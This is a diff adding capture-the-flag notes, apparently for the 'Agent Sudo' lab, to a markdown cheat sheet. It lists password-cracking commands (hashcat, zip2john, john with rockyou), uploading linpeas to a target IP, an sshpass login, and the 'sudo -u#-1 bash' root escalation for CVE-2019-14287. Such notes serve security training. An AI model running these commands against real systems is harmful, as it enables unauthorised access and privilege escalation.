@@ -146,3 +146,26 @@ cat /usr/share/wordlists/rockyou.txt | awk ' {if(length($0) == 4) print $0 }' > 
 # resolve pw
 hashcat -m 3200 "{escaped hash}" ./4char_pw.txt
 ```
+
+## Agent Sudo
+
+```bash
+# extract binary from image file
+binwalk -e {target image file}
+# unzip zip file
+7z e {target zip}
+# show the pw hash of zip file
+zip2john {target zip} > hash_for_john.txt
+# resolve pw from hash
+john hash_for_john.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+```bash
+scp ./linpeas.sh james@10.10.221.112:/dev/shm
+
+# login to target machine with pw
+sshpass -p '{pw}' ssh {username}@{target IP}
+
+# the machine have "CVE-2019-14287" vulnerability. so taking advantage this.
+sudo -u#-1 bash
+```
